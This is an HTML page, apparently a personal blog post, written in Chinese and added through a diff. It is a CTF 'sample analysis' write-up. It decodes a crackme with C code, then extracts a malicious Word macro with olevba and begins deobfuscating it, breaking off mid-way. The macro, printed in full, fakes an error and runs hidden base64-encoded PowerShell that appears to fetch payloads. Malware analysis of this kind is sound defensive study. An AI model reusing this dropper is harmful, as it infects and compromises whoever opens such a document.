@@ -1,0 +1,748 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/dragon.png">
+  <link rel="icon" href="/img/dragon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="peace dawn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="墨者杯-样本分析第二个题很有意思，值得记录一下。 样本分析1给了一个BabyCrack.exe和一个flag.enc, 文件加密 进入ida看程序逻辑如下  对文件输入流中的数据进行了一些条件判断和加密 打开flag.enc提取数据  单字节爆破即可，exp如下： 12345678910111213141516171819202122232425262728293031#include&lt;st">
+<meta property="og:type" content="article">
+<meta property="og:title" content="墨者杯-样本分析">
+<meta property="og:url" content="http://example.com/2024/06/06/%E5%A2%A8%E8%80%85%E6%9D%AF-%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="peace dawn&#39;s personal blog">
+<meta property="og:description" content="墨者杯-样本分析第二个题很有意思，值得记录一下。 样本分析1给了一个BabyCrack.exe和一个flag.enc, 文件加密 进入ida看程序逻辑如下  对文件输入流中的数据进行了一些条件判断和加密 打开flag.enc提取数据  单字节爆破即可，exp如下： 12345678910111213141516171819202122232425262728293031#include&lt;st">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/quietdawn/picture/main/111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/quietdawn/picture/main/222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/quietdawn/picture/main/333.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/quietdawn/picture/main/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/quietdawn/picture/main/8.jpg">
+<meta property="article:published_time" content="2024-06-06T06:59:26.000Z">
+<meta property="article:modified_time" content="2024-06-06T07:09:08.486Z">
+<meta property="article:author" content="peace dawn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/quietdawn/picture/main/111.png">
+  
+  
+  
+  <title>墨者杯-样本分析 - peace dawn&#39;s personal blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"4gMWdFLhDv2bevUzdTcBg0tg-gzGzoHsz","app_key":"eZrG2IwhtuMGp4PM0HIyWHJz","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>peace dawn&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="墨者杯-样本分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-06 14:59" pubdate>
+          2024年6月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">墨者杯-样本分析</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年6月6日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="墨者杯-样本分析"><a href="#墨者杯-样本分析" class="headerlink" title="墨者杯-样本分析"></a>墨者杯-样本分析</h1><p>第二个题很有意思，值得记录一下。</p>
+<h2 id="样本分析1"><a href="#样本分析1" class="headerlink" title="样本分析1"></a>样本分析1</h2><p>给了一个BabyCrack.exe和一个flag.enc, 文件加密</p>
+<p>进入ida看程序逻辑如下</p>
+<p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/111.png" srcset="/img/loading.gif" lazyload></p>
+<p>对文件输入流中的数据进行了一些条件判断和加密</p>
+<p>打开flag.enc提取数据</p>
+<p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/222.png" srcset="/img/loading.gif" lazyload></p>
+<p>单字节爆破即可，exp如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-type">char</span> s[]=&#123;<span class="hljs-string">&quot;knlhkjkhihjiiklwihlgkfkhkwhej&#123;jgkjkihgiglgknklkmlij&#123;hghehghehehihehfly&quot;</span>&#125;;<br>	<span class="hljs-type">int</span>  arr[<span class="hljs-number">128</span>];<br>	<span class="hljs-comment">//for(int i=0;i&lt;strlen(s);i++)</span><br>		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> v7=<span class="hljs-number">0</span>;v7&lt;<span class="hljs-number">128</span>;v7++)<br>		&#123;<br>		    <span class="hljs-keyword">if</span>(v7&gt;<span class="hljs-number">47</span>&amp;&amp;v7&lt;=<span class="hljs-number">96</span>)<br>		    	arr[v7]=v7+<span class="hljs-number">53</span>; 	<br>		    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(v7&lt;=<span class="hljs-number">46</span>)<br>		        arr[v7]=v7+v7%<span class="hljs-number">11</span>;<br>		    <span class="hljs-keyword">else</span><br>		        arr[v7]=v7-v7%<span class="hljs-number">61</span>;<br>		&#125;<br>		<span class="hljs-comment">//for(int i=0;i&lt;128;i++)</span><br>		<span class="hljs-comment">//printf(&quot;%c&quot;,arr[i]);</span><br>		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(s);i++)<br>		   &#123;<br>			<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">128</span>;j++)<br>			&#123;<br>				<span class="hljs-keyword">if</span>(arr[j]==s[i])<br>				&#123;<br>					<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,j);<br>				&#125;<br>			&#125;;<br>		&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到697365634354467B437261636B305F526564324272696768745F32303230303430317D</p>
+<p>十六进制解密得到flag</p>
+<p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/333.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：isecCTF{Crack0_Red2Bright_20200401}</p>
+<h2 id="样本分析2"><a href="#样本分析2" class="headerlink" title="样本分析2"></a>样本分析2</h2><p>给了一个Macro.doc</p>
+<p>使用oletools对其进行分析然后提去相关宏代码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/decalage2/oletools">https://github.com/decalage2/oletools</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">olevba ./Macro.doc<br></code></pre></td></tr></table></figure>
+
+<p>得到宏代码</p>
+<p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Sub A()<br>    Dim B As String<br>    Dim D As Integer<br>    Dim Y2 As String<br>    Dim Y3 As Boolean<br>    D = <span class="hljs-number">1</span> + <span class="hljs-number">2</span><br>    C1 = <span class="hljs-string">&quot;cmd cmd cmd cmd /c msg %username% /v Word experienced an error trying to open the file. &amp;  P^Ow^er^she^L^L -w hidden -ENCOD &quot;</span><br>    C2 = <span class="hljs-string">&quot;cy5FLnQuIC4oLiIuWi55LjMuIi4rLiIuNS4iLikuIC4oLlsuVC55LlAuZS5dLiguIi57LjIufS57LjUufS57LjQufS57LjAufS57LjEufS57LjMufS4iLiAuLS5mLiAuJy5JLlIuZS5DLicuLC4nLlQuby4nLiwuJy5TLnkuUy50LkUuTS4uLicuLC4nLlIuWS4nLiwuJy5PLi4uRC4nLiwuJy5pLicuKS4gLikuOy4gLiAuUy5lLnQuLS5JLlQuRS5NLiAudi5hLnIuaS5BLkIubC5lLjouWS5KLnUuNC56LjMuIC4gLiguWy5ULnkucC5lLl0uKC4iLnsuNC59LnsuNS59LnsuMy59LnsuNi59LnsuMS59LnsuNy59LnsuMC59LnsuMi59LiIuIC4tLmYuJy5jLmUuJy4sLicuZS5ULi4uUy5lLlIuVi4nLiwuJy5wLk8uaS5uLlQuTS5BLk4uQS5nLkUuci4nLiwuJy5TLnQuZS5tLi4uJy4sLicuUy4nLiwuJy5ZLicuLC4nLm4uJy4sLicuaS4nLikuIC4gLikuOy4kLkUuci5yLm8uci5BLmMudC5pLm8ubi5QLnIuZS5mLmUuci5lLm4uYy5lLiAuPS4gLiguKC4nLlMuJy4rLicuaS5sLmUuJy4pLisuJy5uLicuKy4&quot;</span><br>    Y1 = <span class="hljs-number">1</span><br>    Y2 = <span class="hljs-string">&quot;X&quot;</span><br>    Y3 = True<br>    C3 = <span class="hljs-string">&quot;oLicudC5sLicuKy4nLnkuQy5vLicuKS4rLicubi4nLisuKC4nLnQuJy4rLicuaS5uLnUuZS4nLikuKS47LiQuVS4xLnUuaC43LjQuOC49LiQuRS4zLjQuSC4gLisuIC5bLmMuaC5hLnIuXS4oLjYuNC4pLiAuKy4gLiQuRy4zLjUuUS47LiQuQi42LjIuUS49LiguKC4nLkwuJy4rLicuMC4zLicuKS4rLicuSy4nLikuOy4gLiguIC4gLmQuaS5yLiAuIC4oLicuVi5BLnIuSS4nLisuJy5BLicuKy4nLkIuTC4nLisuJy5lLjouei55LjMuNS4nLikuKS4uLnYuYS5MLlUuRS46LjouIi5DLmAuUi5lLkEuYC5ULmUuZC5gLkkuci5FLmMuVC5vLlIueS4iLiguJC5ILk8uTS5FLiAuKy4gLiguKC4oLicuWC5FLjguWi4nLisuJy4zLnQuJy4pLisuKC4nLm4uYy4nLisuJy41LmQuWC5FLjguTC4nLikuKy4nLjYuJy4rLicuei4zLicuKy4nLm8uJy4rLiguJy5vLicuKy4nLjMuWC4nLikuKy4nLkUuOC4nLikuLS5SLmUuUC5MLkEuQy5lLiAuKC5bLkMuSC5BLnIuXS44LjguKy5bLkMuSC5BLnIuXS42LjkuKy5bLkMuSC5BLnIuXS41LjYuKS4sLlsuQy5ILkEuc&quot;</span><br>    <span class="hljs-keyword">If</span> Y1 = <span class="hljs-number">1</span> Then<br>        <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> To <span class="hljs-number">10</span><br>            Y2 = Y2 &amp; Chr(i + <span class="hljs-number">64</span>)<br>        Next i<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>    C4 = <span class="hljs-string">&quot;i5dLjkuMi4pLikuOy4kLk0uOS41LkEuPS4oLicuRi43LicuKy4nLjAuTi4nLikuOy4gLiAuKC5MLnMuIC4gLlYuQS5yLmkuQS5CLmwuZS46LlkuSi5VLjQuWi4zLikuLi52LmEuTC51LkUuOi46LiIucy5lLmAuQy51LnIuYC5pLmAuVC5ZLnAuYC5SLm8udC5PLkMuby5MLiIuIC49LiAuKC4oLicuVC5sLnMuJy4rLicuMS4nLikuKy4nLjIuJy4pLjsuJC5MLjUuXy5DLj0uKC4nLlAuNi4nLisuJy43LksuJy4pLjsuJC5WLmwuei5jLnouaS4wLiAuPS4gLiguJy5PLjIuJy4rLicuOC5DLicuKS47LiQuUC40LjAuTy49LiguJy5XLicuKy4oLicuMy4nLisuJy4xLkMuJy4pLikuOy4kLkYuNC5tLm4ucS5hLmYuPS4kLkguTy5NLkU&quot;</span><br>    C5 = <span class="hljs-string">&quot;uKy4oLiguJy57LjAufS5aLjMudC4nLisuKC4nLm4uYy4nLisuJy41LmQuJy4pLisuJy57LjAufS5MLjYuei4zLicuKy4nLm8uby4zLnsuMC4nLisuJy59LicuKS4gLiAuLS5mLlsuYy5ILmEuci5dLjkuMi4pLisuJC5WLmwuei5jLnouaS4wLisuKC4nLi4uJy4rLiguJy5kLmwuJy4rLicubC4nLikuKS47LiQuSi4wLjQuQi49LiguJy5RLicuKy4oLicuNC4wLicuKy4nLkwuJy4pLikuOy4kLk0ubC4zLmUudi5xLmwuPS4oLicuXS4nLisuJy5lLjEuJy4rLicuci5bLicuKy4nLlMuJy4rLiguJy46Li8uLy5hLm4uJy4rLicucy4nLisuJy52LmEudC4uLmMuby4nLisuJy5tLicuKy4nLi8uJy4pLisuKC4nLnMucC4tLicuKy4nLmQuJy4rLicuZC5tLmkubi4vLmYudy4nLikuKy4nLi8uJy4rLiguJy5ALl0uJy4rLicuZS4xLicuKS4rLicuci5bLicuKy4nLlMuJy4rLicuOi4vLicuKy4oLicuLy5nLmkudC4nLisuJy50LmguJy4rLicuZS4nLikuKy4oLicuaS5uLmQuJy4rLicuay5hLicuKS4rLiguJy5kLicuKy4nLmkuci5lLicuKS4rLicuYy50LicuKy4oLicuby5yLmwuLi5jLicuKy4nLm8uJy4pLisuJy5tLicuKy4nLi8uMi4nLisuJy4vLnEuJy4rLiguJy5PLlkuJy4rLicudy4nLikuKy4nLlQuJy4rLiguJy4vLkAuJy4rLicuXS5lLjEuci&quot;</span><br>    C6 = <span class="hljs-string">&quot;5bLicuKy4nLlMuJy4rLicuOi4vLicuKS4rLiguJy4vLmUubC5vLmcuJy4rLicucy4uLmcuJy4pLisuKC4nLjQuJy4rLicuZy50LmUuYy5oLm4uJy4rLicudC5sLm8uZy5pLmUuJy4pLisuJy5zLicuKy4oLicuLi5jLm8ubS4vLmIuJy4rLicueS4nLikuKy4oLicuby4nLisuJy51LnMuLy52LicuKS4rLiguJy4vLkAuJy4rLicuXS5lLjEuci4nLikuKy4oLicuWy5TLjouLy4vLicuKy4nLnAuYS4nLisuJy50LnQuYS4nLisuJy55LicuKy4nLmkucy50Lm8uby5lLicuKS4rLicuLi5jLicuKy4oLicuby5tLicuKy4nLi8udi5pLicuKS4rLiguJy5wLmkuby4tLicuKy4nLnouJy4pLisuKC4nLmUudC53LicuKy4nLm8uJy4pLisuKC4nLnguay4tLjEuJy4rLicuaC4nLikuKy4oLicubS4nLisuJy5wLnAuLy4nLikuKy4oLicuYy41Li8uQC4nLisuJy5dLicuKS4rLicuZS4nLisuKC4nLjEuci5bLlMuJy4rLicuOi4nLikuKy4oLicuLy4vLnIucy4nLisuJy52LicuKS4rLicubS5hLicuKy4oLicuYi4nLisuJy5pLm4uJy4pLisuKC4nLm4uJy4rLicuaC4uLmMuJy4pLisuKC4nLm8ubS4nLisuJy4vLm0ucC4nLisuJy4tLmM&quot;</span><br>    <span class="hljs-built_in">Select</span> Case Y3<br>        Case True<br>            Y4 = Y1 &amp; Y2<br>        Case False<br>            Y5 = Y1 &amp; Y2<br>    <span class="hljs-keyword">End</span> <span class="hljs-built_in">Select</span><br>    C7 = <span class="hljs-string">&quot;uby5uLicuKS4rLiguJy50LicuKy4nLnEubi4nLikuKy4oLicudC4vLjEuJy4rLicuNi4nLisuJy5xLlQuLy5ALicuKy4nLl0uZS4xLicuKS4rLiguJy5yLlsuUy4nLisuJy5zLjouLy4vLicuKy4nLmUuZS4nLikuKy4oLicubi4nLisuJy5tLm8uJy4pLisuKC4nLnIuZS55Li4uJy4rLicudC4nLisuJy51LnMuaS5uLicuKS4rLiguJy55LnMuJy4rLicucy4vLncucC4nLikuKy4oLicuLS5jLm8uJy4rLicubi50LmUuJy4rLicubi50LicuKS4rLiguJy4vLicuKy4nLm4udS5XLicuKy4nLi8uQC5dLmUuMS5yLlsuJy4pLisuJy5TLicuKy4oLicucy46Li8uJy4rLicuLy4nLisuJy5zLnUuJy4rLicuaS5lLm8ucC50LicuKS4rLicuby4nLisuJy5tLmkuJy4rLiguJy5wLmUuJy4rLicuLi5jLm8uJy4pLisuJy5tLicuKy4oLicuLy4nLisuJy53LmUuJy4&quot;</span><br>    C8 = <span class="hljs-string">&quot;pLisuKC4nLjEuMS4nLisuJy4tLicuKS4rLiguJy5rLm4uJy4rLicueC53Lm4uLy4nLisuJy5TLnMuJy4pLisuKC4nLkUuJy4rLicucy4vLicuKS4pLi4uIi5SLmUuUC5gLkwuYS5gLmMuRS4iLiguKC4nLl0uJy4rLiguJy5lLicuKy4nLjEuci5bLicuKS4rLicuUy4nLikuLC4oLlsuYS5yLnIuYS55Ll0uKC4nLnMuZC4nLiwuJy5zLncuJy4pLiwuKC4nLmgudC4nLisuJy50LnAuJy4pLiwuJy4zLmQuJy4pLlsuMS5dLikuLi4iLlMucC5MLmAuaS50LiIuKC4kLlIuNy4xLlAuIC4rLiAuJC5VLjEudS5oLjcuNC44LiAuKy4gLiQuWC40LjkuUi4pLjsuJC5JLjEuNC5HLj0uKC4nLlcuJy4rLiguJy45LicuKy4nLjQuRy4nLikuKS47LmYuby5yLmUuYS5jLmguIC4oLiQuUS54LjUuNS5pLnouNS4gLmkubi4gLiQuTS5sLjMuZS52LnEubC4pLnsudC5yLnkuey4oLi4uKC4nLk4uZS53LicuKy4nLi0uTy5iLmouJy4rLicuZS5jLnQuJy4pLiAucy55LlMudC5FLm0uLi5uLmUuVC4uLlcuRS5CLmMubC5pLk&quot;</span><br>    C9 = <span class="hljs-string">&quot;Uubi50LikuLi4iLmQuYC5PLmAudy5uLkwuby5gLkEuRC5mLkkubC5FLiIuKC4kLlEueC41LjUuaS56LjUuLC4gLiQuRi40Lm0ubi5xLmEuZi4pLjsuJC5HLjUuMC5DLj0uKC4nLlUuJy4rLiguJy4zLjcuJy4rLicuVy4nLikuKS47LkkuZi4gLiguKC4mLiguJy5HLmUudC4tLicuKy4nLkkudC5lLicuKy4nLm0uJy4pLiAuJC5GLjQubS5uLnEuYS5mLikuLi4iLkwuRS5OLmAuRy50LmguIi4gLi0uZy5lLiAuMy4xLjkuNi4zLikuIC57LiYuKC4nLnIuJy4rLicudS5uLmQubC4nLisuJy5sLjMuMi4nLikuIC4kLkYuNC5tLm4ucS5hLmYuLC4oLiguJy5DLicuKy4nLm8ubi50LnIuby4nLisuJy4xLl8uUi51LicuKS4rLicubi5ELicuKy4nLkwuJy4rLicuTC4nLikuLi4iLnQuYC5PLnMuYC5ULnIuSS5OLkcuIi4oLikuOy4kLkguMy43LkMuPS4oLicuSC4nLisuKC4nLjMuMC4nLisuJy5KLicuKS4pLjsuYi5yLmUuYS5rLjsuJC5LLjQuXy5RLj0uKC4nLk0uMS4nLisuJy42LlEuJy4pLn0ufS5jLmEudC5jLmguey59Ln0uJC5CLjcuMi5ILj0uKC4nLlMuJy4rLiguJy5fLl8uJy4rLicuWC4nLikuKS4=&quot;</span><br>    B = C1 &amp; C2 &amp; C3 &amp; C4 &amp; C5 &amp; C6 &amp; C7 &amp; C8 &amp; C9<br>    Shell B, vbHide<br><span class="hljs-keyword">End</span> Sub<br></code></pre></td></tr></table></figure>
+
+<p>base64进行解码</p>
+<p>得到经过混淆的powershell代码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">s.E.t. .(.<span class="hljs-string">&quot;.Z.y.3.&quot;</span>.+.<span class="hljs-string">&quot;.5.&quot;</span>.). .(.[<span class="hljs-type">.T.y.P.e.</span>].(.<span class="hljs-string">&quot;.&#123;.2.&#125;.&#123;.5.&#125;.&#123;.4.&#125;.&#123;.0.&#125;.&#123;.1.&#125;.&#123;.3.&#125;.&quot;</span>. .-.f. .<span class="hljs-string">&#x27;.I.R.e.C.&#x27;</span>.,.<span class="hljs-string">&#x27;.T.o.&#x27;</span>.,.<span class="hljs-string">&#x27;.S.y.S.t.E.M...&#x27;</span>.,.<span class="hljs-string">&#x27;.R.Y.&#x27;</span>.,.<span class="hljs-string">&#x27;.O...D.&#x27;</span>.,.<span class="hljs-string">&#x27;.i.&#x27;</span>.). .).;. . .S.e.t.-.I.T.E.M. .v.a.r.i.A.B.l.e.:.Y.J.u.<span class="hljs-number">4</span>.z.<span class="hljs-number">3</span>. . .(.[<span class="hljs-type">.T.y.p.e.</span>].(.<span class="hljs-string">&quot;.&#123;.4.&#125;.&#123;.5.&#125;.&#123;.3.&#125;.&#123;.6.&#125;.&#123;.1.&#125;.&#123;.7.&#125;.&#123;.0.&#125;.&#123;.2.&#125;.&quot;</span>. .-.f.<span class="hljs-string">&#x27;.c.e.&#x27;</span>.,.<span class="hljs-string">&#x27;.e.T...S.e.R.V.&#x27;</span>.,.<span class="hljs-string">&#x27;.p.O.i.n.T.M.A.N.A.g.E.r.&#x27;</span>.,.<span class="hljs-string">&#x27;.S.t.e.m...&#x27;</span>.,.<span class="hljs-string">&#x27;.S.&#x27;</span>.,.<span class="hljs-string">&#x27;.Y.&#x27;</span>.,.<span class="hljs-string">&#x27;.n.&#x27;</span>.,.<span class="hljs-string">&#x27;.i.&#x27;</span>.). . .).;.<span class="hljs-variable">$</span>.E.r.r.o.r.A.c.t.i.o.n.P.r.e.f.e.r.e.n.c.e. .=. .(.(.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.l.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.t.l.&#x27;</span>.+.<span class="hljs-string">&#x27;.y.C.o.&#x27;</span>.).+.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.n.u.e.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.U.<span class="hljs-number">1</span>.u.h.<span class="hljs-number">7.4</span>.<span class="hljs-number">8</span>.=.<span class="hljs-variable">$</span>.E.<span class="hljs-number">3.4</span>.H. .+. .[<span class="hljs-type">.c.h.a.r.</span>].(.<span class="hljs-number">6.4</span>.). .+. .<span class="hljs-variable">$</span>.G.<span class="hljs-number">3.5</span>.Q.;.<span class="hljs-variable">$</span>.B.<span class="hljs-number">6.2</span>.Q.=.(.(.<span class="hljs-string">&#x27;.L.&#x27;</span>.+.<span class="hljs-string">&#x27;.0.3.&#x27;</span>.).+.<span class="hljs-string">&#x27;.K.&#x27;</span>.).;. .(. . .d.i.r. . .(.<span 